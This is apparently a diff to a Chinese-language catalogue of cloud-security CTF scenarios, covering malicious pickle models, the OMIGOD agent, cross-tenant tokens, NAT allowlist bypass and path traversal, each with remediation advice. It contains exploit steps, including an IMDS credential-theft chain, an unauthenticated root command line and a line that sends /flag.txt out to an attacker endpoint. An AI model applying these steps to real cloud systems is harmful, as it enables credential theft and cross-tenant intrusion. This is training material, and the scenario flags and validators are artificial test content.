-   python urllib 把 `/flag.txt` 外发到攻击者 `/exfil`。
-4. 触发受害者工作负载 `/pull`——它执行被覆盖的镜像内容，攻击者收到
-   外发的 flag。
-5. 终端服务 租户工作负载 向 flag-vault 出示工作负载地址（拉镜像时下发密文，运行完即删），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 租户工作负载 向 flag-vault 出示「工作负载地址（拉镜像时下发密文，运行完即删）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-18-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-18 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-18 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Build fleet runner, OCI image registry, and tenant pulls |
-| 侦察与前置条件 | RUN instruction execution and internal registry authorization model |
-| 核心漏洞与利用 | Execute a build job and overwrite a trusted internal image |
-| 权限、横向或影响 | Cross-tenant supply-chain execution |
-| 验证 | Trigger the tenant pull and capture the resulting flag |
-
-**修复建议**
-
-内部 registry 必须按租户/项目做鉴权与不可变 tag；构建机不得持有
-可写内部 registry 的凭据；供应链信任要显式化。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-19"></a>
-
-### CLOUD-19 · 模型即代码：恶意 pickle → 推理 Pod → 节点 IMDS
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-19 |
-| 名称 | Model-as-Code: Malicious Pickle → Inference Pod → Node IMDS |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (pickle deserialization, case #091) |
-| 入口 | `localhost:10630` |
-| 目录 | `scenarios/cloud/pickle-model` |
-
-**场景概述**
-
-托管推理平台加载租户上传的 PyTorch/pickle 模型——"加载模型"就是执行
-代码（pickle 反序列化会调用 `__reduce__`）。平台虽有 pickle 扫描器，
-但只警告不拦截。恶意模型在推理 pod 内 RCE，接着访问节点 IMDS 窃取
-节点 IAM 角色，最后用节点身份读取集群 Secret。
-
-**教材锚点**
-
-- 案例：Hugging Face gpt2 恶意 pickle（#091）；推理 pod 逃逸（Ch10）
-- 平面：数据面（推理）→ 宿主/节点 → 失败边界：命名空间/身份
-- 六镜头：MAGIC（托管推理是"运行你给的代码"这一产品本身）；
-  DETECTION（扫描器是警告不是门禁）
-
-**前置知识 / 条件**
-
-- Python pickle 反序列化（`__reduce__`）
-- 节点 IMDS 与节点 IAM 角色；EKS 集群凭据
-
-**利用步骤**
-
-1. 构造 `__reduce__` 返回 `subprocess.check_output(cmd)` 的 pickle，
-   命令为访问节点 IMDS 的 Python 代码。
-2. 上传模型——注册表返回"dangerous pickle detected"，但**仍接受**。
-3. 调用 `/infer` 触发加载，命令输出（节点角色名）作为推理结果返回。
-4. 再上传一个窃取凭据的模型，拿到节点 AccessKey/SecretKey/Token。
-5. 用节点 Token 调集群 `/secrets`，读到 Secret 与 flag。
-6. 终端服务 cluster-api 向 flag-vault 出示节点身份 Bearer 令牌，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 cluster-api 向 flag-vault 出示「节点身份 Bearer 令牌」（校验模式 `header-secret`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-19-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-19 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-19 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Python pickle, model registry, inference pod, and node IMDS |
-| 侦察与前置条件 | Model upload/deserialization flow and pod credential exposure |
-| 核心漏洞与利用 | Upload a malicious pickle model |
-| 权限、横向或影响 | Inference pod execution followed by node metadata credential access |
-| 验证 | Use the model/IMDS result to read the flag |
-
-**修复建议**
-
-推理平台应使用非 pickle 格式（safetensors）或隔离沙箱加载；扫描器
-必须能拦截；推理 pod 不应能访问节点 IMDS。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-20"></a>
-
-### CLOUD-20 · AttachMe：可预测资源 ID + 属主校验缺失
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-20 |
-| 名称 | AttachMe: Predictable Volume ID + Missing Ownership Check |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (control-plane ownership check missing) |
-| 入口 | `localhost:10631` |
-| 目录 | `scenarios/cloud/attachme-volume` |
-
-**场景概述**
-
-块存储控制面的资源 ID 可预测（`ocid.vol.<4位>`，从 1000 顺序分配），
-而 AttachVolume 接口从不校验调用者是否为卷属主。攻击者猜出受害者
-卷 ID，直接附加到自己实例并读取卷内数据——一次控制面"属主校验缺失"
-的跨租户攻击。
-
-**教材锚点**
-
-- 案例：AttachMe（可预测 OCID + 缺失授权检查，Ch11 Breakdown 3）
-- 平面：控制面（块存储 API）→ 失败边界：账号/属主
-- 六镜头：IDENTITY（API 不复检调用者身份）；BOUNDARY（属主校验缺失）；
-  DETECTION（控制面调用会产生审计，但属主校验缺陷本身无感知）
-
-**前置知识 / 条件**
-
-- 控制面 API 的资源 ID 结构与可预测性
-- "属主校验"与"认证"是两个不同控制点
-
-**利用步骤**
-
-1. 阅读控制面文档，了解 ID 格式 `ocid.vol.<4位>`。
-2. 枚举/猜测 `ocid.vol.1001`，查询详情确认属主是 victim-tenant。
-3. 调用 `/attach` 把该卷附加到攻击者实例（无属主校验）。
-4. 从实例读取卷数据，得到 flag。
-5. 终端服务 control-api 向 flag-vault 出示块存储控制面内网地址，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 control-api 向 flag-vault 出示「块存储控制面内网地址」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-20-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-20 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-20 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Cloud volume control plane, volume IDs, and instance attachment |
-| 侦察与前置条件 | Predictable volume identifier pattern and ownership validation behavior |
-| 核心漏洞与利用 | Request attachment of a victim volume by ID |
-| 权限、横向或影响 | Cross-tenant block storage access |
-| 验证 | Mount/read the attached volume flag |
-
-**修复建议**
-
-AttachVolume 必须校验卷属主与调用者一致；资源 ID 应不可预测
-（足够熵）；控制面 API 默认 deny。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-21"></a>
-
-### CLOUD-21 · Entra Actor Token：身份 actor 校验缺陷
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-21 |
-| 名称 | Entra Actor Token: Tenant-A Token Accepted by Tenant-B Directory |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (actor/tenant validation bug, case #246) |
-| 入口 | `localhost:10632` |
-| 目录 | `scenarios/cloud/actor-token` |
-
-**场景概述**
-
-目录 API 只校验 JWT 签名，从不检查 token 声明的租户与被访问的租户
-是否一致（actor/tenant 绑定缺失）。攻击者用自己租户（tenant-a）签发
-的 token 直接访问 tenant-b 的目录，以"全局管理员"身份读到对方数据。
-
-**教材锚点**
-
-- 案例：Entra ID actor token 校验缺陷导致跨租户全局管理员（#246）
-- 平面：控制面（身份）→ 失败边界：身份/账号
-- 六镜头：IDENTITY（签名有效 ≠ 主体有权访问目标租户）；BOUNDARY（租户
-  边界靠 claim 校验，而该校验缺失）
-
-**前置知识 / 条件**
-
-- JWT 结构与签名验证；OAuth/Entra 的 tenant 绑定（issuer/audience/actor）
-
-**利用步骤**
-
-1. 从身份服务为 `tenant-a` 获取签名 token。
-2. 携带该 token 请求 `GET /api/users?tenant=tenant-b`。
-3. 服务端仅验签、不比对 token 租户，返回 tenant-b 的用户列表与 flag。
-4. 终端服务 directory-api 向 flag-vault 出示本租户令牌（HS256），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 directory-api 向 flag-vault 出示「本租户令牌（HS256）」（校验模式 `jwt`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-21-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-21 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-21 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Entra-style actor tokens, directory APIs, and tenant claims |
-| 侦察与前置条件 | Actor/tenant claim handling across directory endpoints |
-| 核心漏洞与利用 | Present a Tenant-A actor token to a Tenant-B operation |
-| 权限、横向或影响 | Cross-tenant identity confusion |
-| 验证 | Use the accepted token to retrieve the tenant flag |
-
-**修复建议**
-
-令牌校验必须同时验证 tenant/issuer/audience 与被访问资源一致；actor
-与 subject 分离校验；跨租户访问一律默认拒绝。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-22"></a>
-
-### CLOUD-22 · OMIGOD：供应商中间件无鉴权管理通道
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-22 |
-| 名称 | OMIGOD: Cloud Middleware Unauth Management Channel → VM Root |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (auth bypass in provider agent, CVE-2021-38647 lineage) |
-| 入口 | `localhost:10633` |
-| 目录 | `scenarios/cloud/omigod-agent` |
-
-**场景概述**
-
-供应商在租户 VM 上静默安装的 OMI 中间件（模拟管理端口 5986）不做任何
-认证，任何能到达该端口的人都能以 root 执行命令（CVE-2021-38647 认证
-绕过）。该代理由供应商部署、不受客户补丁管理——一个 bug 就是所有
-装有该代理的 VM 的共同风险（provider-side 组件）。
-
-**教材锚点**
-
-- 案例：OMIGOD（#057/#087）；RHUI（#068）
-- 平面：控制面（供应商代理）→ 失败边界：网络 + provider-side
-- 六镜头：MAGIC（供应商自动化以 root 运行）；SHARED（代理安装在所有
-  租户 VM 上，爆炸半径为"所有租户"）；DETECTION（客户不感知代理存在，
-  也无补丁责任）
-
-**前置知识 / 条件**
-
-- 云中间件 / 共享责任模型中的盲区
-- 无鉴权管理端口的利用
-
-**利用步骤**
-
-1. 扫描内部 VM，发现 vm-b 的 5986 端口开放且 banner 显示 OMI Agent。
-2. 直接 POST `/wsman/exec`（无需任何凭据）执行命令：先确认 root 身份，再从中间件容器里
-   向供应商密钥库取密文（该密钥库只对 omi-agent 的地址开放）：
-   `id; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())"`
-3. 以 root 拿到 VM 上的 flag。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 omi-agent 向 flag-vault 出示「中间件代理内网地址（未鉴权通道拿到 root 后取）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-22-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-22 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-22 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Cloud middleware agent management API and VM services |
-| 侦察与前置条件 | Unauthenticated management endpoint discovery |
-| 核心漏洞与利用 | Call the vulnerable OMI management channel |
-| 权限、横向或影响 | VM root-level command execution |
-| 验证 | Execute the agent command path to read the flag |
-
-**修复建议**
-
-管理通道必须强认证 + 双向 TLS；供应商部署的中间件要纳入客户补丁
-可见性；5986 等管理端口不得对租户网络开放。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-23"></a>
-
-### CLOUD-23 · IAM 枚举 2.0：无日志访问拒绝 oracle
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-23 |
-| 名称 | IAM Enumeration 2.0: Unlogged AccessDenied Oracle |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (uncovered service error oracle, case #134/#137) |
-| 入口 | `localhost:10634` |
-| 目录 | `scenarios/cloud/iam-enum-oracle` |
-
-**场景概述**
-
-CloudTrail 并不覆盖所有服务：调用不支持的 API 不产生任何审计事件，
-但 AccessDenied 错误仍会返回调用者的完整 ARN（身份枚举 oracle）。
-同理，`sts:AssumeRole` 的错误信息在"角色存在但不可信"与"角色不存在"
-之间有差异，可用作跨账号角色枚举的布尔 oracle——受害者的审计日志
-全程为空。
-
-**教材锚点**
-
-- 案例：IAM enumeration 2.0（#134）；AssumeRole 角色枚举（#137）
-- 平面：控制面（枚举）→ 失败边界：检测（no-event 层）
-- 六镜头：DETECTION（无事件即不可见）；IDENTITY（错误信息泄露主体身份）
-
-**前置知识 / 条件**
-
-- CloudTrail 覆盖范围与"无事件层"
-- 错误差分 oracle（verbose error differential）
-
-**利用步骤**
-
-1. 用泄露的密钥调用未记录 API `/api/unsupported`——AccessDenied 返回
-   完整 ARN，且审计日志无记录。
-2. 对单词表逐个调用公开 STS 入口 `http://localhost:10723/assume-role`，
-   比对错误信息差异，确认存在的角色
-   （AdminRole / SecretRole / DataPipelineRole）。
-3. 验证「未记录层」：按端点过滤查询公开审计入口——
-   `http://audit-log:5000/logs?path=/api/unsupported` 返回 0 条记录，
-   并返回动态 Flag；对照 `http://audit-log:5000/logs?path=/api/supported`
-   会返回 ≥1 条记录，证明 `control-api` 已公布的 `/api/supported` 是
-   **被审计覆盖**的端点。
-
-> 审计 Flag 的判定条件是「指定端点没有任何审计条目」，而不是「审计日志
-> 整体为空」。因此先探测 `/api/supported` 不会打掉 Flag——它只是对照组，
-> 说明被覆盖的 API 会留痕。
-4. 终端服务 audit-log 向 flag-vault 出示审计服务内网地址（零审计条目的过滤查询），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 audit-log 向 flag-vault 出示「审计服务内网地址（零审计条目的过滤查询）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-23-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-23 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-23 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | IAM APIs, AccessDenied responses, and STS role assumption |
-| 侦察与前置条件 | Role/user candidate generation and response-difference analysis |
-| 核心漏洞与利用 | Use an unlogged AccessDenied oracle to enumerate valid identities |
-| 权限、横向或影响 | Stealthy identity reconnaissance and role targeting |
-| 验证 | Assume/enumerate the discovered identity to obtain the flag |
-
-**修复建议**
-
-所有 API 都应被审计（含错误响应）；错误信息不得携带调用者 ARN；
-AssumeRole 失败信息统一（feature-inherent oracle 需在设计上消除）。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-24"></a>
-
-### CLOUD-24 · Service Catalog：非生产端点不可见写
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-24 |
-| 名称 | Service Catalog Beta Endpoint: Invisible Write |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (non-production endpoint skips audit, case #154) |
-| 入口 | `localhost:10635` |
-| 目录 | `scenarios/cloud/beta-endpoint` |
-
-**场景概述**
-
-云控制台页面的 CSP 头泄露了非生产（beta/gamma）端点
-`aws242-servicecatalog-beta`。该端点接受与生产相同的普通凭据，
-执行真实的写操作，却完全不产生审计事件——"不可见变更"。
-
-**教材锚点**
-
-- 案例：Bypassing CloudTrail in AWS Service Catalog（#154）
-- 平面：控制面（写操作）→ 失败边界：检测（日志路由）
-- 六镜头：DETECTION（beta 端点绕过生产日志管线）；MAGIC（非生产
-  基础设施与生产共享凭据）
-
-**前置知识 / 条件**
-
-- 控制台 CSP 头可泄露内部端点；非生产环境的审计盲区
-
-**利用步骤**
-
-1. 读取控制台页面（`localhost:10727`）源码，从 CSP `connect-src` 中发现
-   beta 端点 `aws242-servicecatalog-beta`；页面 bundle 同时泄露了生产
-   端点使用的共享凭据（`X-Api-Key: valid-sigv4`）。
-2. 用该凭据向 production 端点（`localhost:10729`）POST `/portfolios`
-   建立基线——写入成功，并产生一条审计事件。
-3. 用同一凭据向 beta 端点（入口 `localhost:10635`）POST `/portfolios`：
-   创建成功，响应只返回 `portfolio_id`，且**不产生新的审计事件**。
-4. 用同一凭据 `GET /portfolios/<portfolio_id>` 读取资源，获得 flag。
-5. 查询 `audit-log:5000/logs`：审计计数相比第 2 步没有增长，写操作完全
-   不可见。
-
-> 无凭据或错误凭据的请求返回 403——本场景刻画的是“审计盲区”而非
-> “未鉴权接口”，因此调用者校验与生产端点保持一致。
-6. 终端服务 beta-api 向 flag-vault 出示beta 端点内网地址（不可见写入），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 beta-api 向 flag-vault 出示「beta 端点内网地址（不可见写入）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-24-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-24 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-24 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Service catalog control plane, beta APIs, and audit logging |
-| 侦察与前置条件 | Production/beta endpoint discovery and audit event comparison |
-| 核心漏洞与利用 | Send a write through the non-production endpoint |
-| 权限、横向或影响 | Unaudited control-plane state change |
-| 验证 | Verify the hidden write/flag while confirming the audit blind spot |
-
-**修复建议**
-
-非生产端点必须走同一审计管线；CSP 不应暴露内部域名；beta 端点
-不得接受生产凭据执行真实写操作。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-25"></a>
-
-### CLOUD-25 · Resource Explorer：静默枚举
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-25 |
-| 名称 | Resource Explorer: Feature-Inherent Quiet Enumeration |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (unlogged search API, case #148) |
-| 入口 | `localhost:10636` |
-| 目录 | `scenarios/cloud/resource-explorer` |
-
-**场景概述**
-
-资源搜索服务（Resource Explorer）会索引租户内全部资源，但搜索操作
-本身不产生任何审计事件（feature-inherent 盲区）。攻击者用它一次性
-摸清账号的资源拓扑，再精确定位敏感资源（flag-store），全程日志为空。
-
-**教材锚点**
-
-- 案例：Enumerating AWS the quiet way: Resource Explorer（#148）
-- 平面：控制面（搜索 API）→ 失败边界：检测（特性固有盲区）
-- 六镜头：DETECTION（搜索 API 不产事件，且无法通过客户配置补上）；
-  SHARED（资源索引聚合了所有资源元数据）
-
-**前置知识 / 条件**
-
-- 资源搜索/探索类服务的审计覆盖差异
-
-**利用步骤**
-
-1. 用空查询/关键词（prod、role、flag）调用 `/search`，枚举全部资源。
-2. 调用 `/whoami` 取得调用者上下文（`caller_arn`，即 `X-Caller-ARN`
-   需要携带的值）。
-3. 搜索只返回资源元数据（不含 secret）；发现 `flag-store` 后，携带
-   该 `caller_arn` 请求 `/resources/s-001` 读取详情，获得 flag；
-   缺少调用者上下文时返回 403。
-4. 检查公开审计入口 `http://audit-log:5000/logs`：审计为 0，枚举不可见。
-5. 终端服务 explorer-api 向 flag-vault 出示资源浏览器内网地址（静默读取），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 explorer-api 向 flag-vault 出示「资源浏览器内网地址（静默读取）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-25-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-25 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-25 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Cloud resource explorer/search API and tenant inventory |
-| 侦察与前置条件 | Search query semantics and audit visibility |
-| 核心漏洞与利用 | Enumerate resources through the feature-inherent quiet API |
-| 权限、横向或影响 | Stealthy cloud resource discovery |
-| 验证 | Use discovered resource metadata to recover the flag |
-
-**修复建议**
-
-搜索 API 也应记录操作者与查询；敏感资源（凭据存储）不应出现在
-默认索引中。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-26"></a>
-
-### CLOUD-26 · CloudImposer：托管数据平台依赖混淆
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-26 |
+| ID | CLOUD-02 |
 | 名称 | CloudImposer: Dependency Confusion in Managed Data Platform |
 | 交付方式 | docker |
 | 难度 | L3 |
@@ -1978,9 +235,9 @@ AssumeRole 失败信息统一（feature-inherent oracle 需在设计上消除）
 - 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
 - 交付条件：只有 victim-resource 向 flag-vault 出示「平台工作负载令牌」（校验模式 `header-secret`）时才交付；
   其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-26-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-26 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-26 <flag>`（参考利用）。
+- 形态：`flag{cloud-02-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py cloud-02 <flag>`（gate）+
+  `python3 tests/cloud/run.py cloud-02 <flag>`（参考利用）。
 
 **知识维度**
 
@@ -2001,354 +258,16 @@ AssumeRole 失败信息统一（feature-inherent oracle 需在设计上消除）
 
 ---
 
-<a id="cloud-27"></a>
-
-### CLOUD-27 · Silent Reaper：低代码连接器密钥控制面外泄
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-27 |
-| 名称 | Silent Reaper: Low-Code Connector Secrets via Control Plane |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (connector store tenant-scope missing, case #249/#197) |
-| 入口 | `localhost:10638` |
-| 目录 | `scenarios/cloud/lowcode-secrets` |
-
-**场景概述**
-
-低代码平台（Logic Apps/API Connections 类）的连接器存储控制面 API
-可以跨租户列出连接器并返回其密钥——调用者身份与连接器属主从未校验。
-攻击者一次性抽走所有租户的连接器密钥（Silent Reaper / API Connections）。
-
-**教材锚点**
-
-- 案例：Silent Reaper（#249）；API Connections 跨租户（#197）；
-  Vault Recon（#250）
-- 平面：控制面（连接器存储）→ 失败边界：账号/共享组件
-- 六镜头：SHARED（连接器存储是供应商侧共享组件，爆炸半径为所有租户）；
-  IDENTITY（列表/读取端点不校验调用者租户）
-
-**前置知识 / 条件**
-
-- 低代码平台连接器与托管身份模型；控制面 API 的租户 scope
-
-**利用步骤**
-
-1. 调用 `GET /api/connections` 列出连接器——发现 tenant-b 的
-   SharePoint 连接器。
-2. 调用 `GET /api/connections/conn-1002` 直接读取 secret。
-3. secret 中携带 flag。
-4. 终端服务 connector-store 向 flag-vault 出示连接器控制面内网地址（跨租户读取），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 connector-store 向 flag-vault 出示「连接器控制面内网地址（跨租户读取）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-27-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-27 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-27 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Low-code connector control plane and secret storage |
-| 侦察与前置条件 | Connector identifier/tenant scope behavior |
-| 核心漏洞与利用 | Request a connector secret outside the caller tenant |
-| 权限、横向或影响 | Cross-tenant credential disclosure |
-| 验证 | Read the returned connector secret/flag |
-
-**修复建议**
-
-控制面读取必须按调用者租户过滤；连接器密钥不应通过列表/详情 API
-返回明文；密钥应加密并短时效轮换。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-28"></a>
-
-### CLOUD-28 · 共享 NAT 出口：源 IP 白名单绕过
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-28 |
-| 名称 | Shared NAT Egress: Source-IP Allowlist Bypass |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (service-tag source-IP trust, case #259) |
-| 入口 | `localhost:10639` |
-| 目录 | `scenarios/cloud/shared-nat` |
-
-**场景概述**
-
-受害者防火墙按源 IP 信任供应商"服务地址段"（Azure service tags 模型）。
-攻击者租户与受害者共享供应商托管的 NAT 出口——从该出口发出的流量
-源 IP 落在受信段内，直接绕过白名单。攻击者不需要伪造任何 header，
-是网络软边界本身的问题。
-
-**教材锚点**
-
-- 案例：Abusing Service Tags to bypass Azure Firewall（#259）
-- 平面：数据面（网络）→ 失败边界：网络软边界
-- 六镜头：BOUNDARY（源 IP 不是身份）；SHARED（托管 NAT 是共享出口，
-  受信地址段被多租户共用）
-
-**前置知识 / 条件**
-
-- 基于源 IP 的防火墙与"服务标签/地址段"信任模型
-
-**利用步骤**
-
-1. 直接访问受害者 `/flag`——源 IP 不在受信段，403。
-2. 调用共享 NAT `/egress` 代理访问受害者 `/flag`——出口源 IP
-   落在 168.63.0.0/24 受信段，返回 flag。
-3. 终端服务 victim-api 向 flag-vault 出示受保护接口内网地址（经共享 NAT 出口），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 victim-api 向 flag-vault 出示「受保护接口内网地址（经共享 NAT 出口）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-28-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-28 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-28 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Shared NAT egress, HTTP forwarding, and source-IP allowlists |
-| 侦察与前置条件 | Trusted provider address range and target firewall policy |
-| 核心漏洞与利用 | Route a request through the shared NAT |
-| 权限、横向或影响 | Bypass source-IP-based trust boundary |
-| 验证 | Read the protected API response containing the flag |
-
-**修复建议**
-
-防火墙不要基于源 IP/服务标签做信任决策；服务地址段不能与租户
-共享出口混用；对敏感服务使用身份级认证。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-29"></a>
-
-### CLOUD-29 · Dataform：托管数据服务跨租户路径穿越
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-29 |
-| 名称 | Dataform: Cross-Tenant Path Traversal in Managed Data Service |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (cross-tenant path traversal, case #267) |
-| 入口 | `localhost:10640` |
-| 目录 | `scenarios/cloud/dataform-pt` |
-
-**场景概述**
-
-托管数据工作流服务把所有租户的工作区放在同一个共享执行器上，而
-dataset 引用的路径没有做容器化校验。攻击者提交 `../` 引用即可
-读写其他租户工作区的文件（Dataform 跨租户路径穿越）。
-
-**教材锚点**
-
-- 案例：Dataform cross-tenant path traversal（#267）
-- 平面：数据面（管线执行）→ 失败边界：命名空间/账号
-- 六镜头：SHARED（共享执行器承载所有租户工作区）；BOUNDARY（路径
-  规范化未加租户容器约束）
-
-**前置知识 / 条件**
-
-- 路径穿越；托管数据服务的多租户工作区模型
-
-**利用步骤**
-
-1. 查看控制面文档，确认所有租户在同一共享执行器上。
-2. 提交 workflow：`workspace=tenant-a`，
-   `dataset_ref=../tenant-b/secret.txt`（从本租户工作区逃逸到相邻租户）。
-3. 执行器解析出 `tenant-b/secret.txt`，返回内容与 flag。
-4. 终端服务 shared-executor 向 flag-vault 出示共享执行器内网地址（路径逃出本租户工作区），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 shared-executor 向 flag-vault 出示「共享执行器内网地址（路径逃出本租户工作区）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
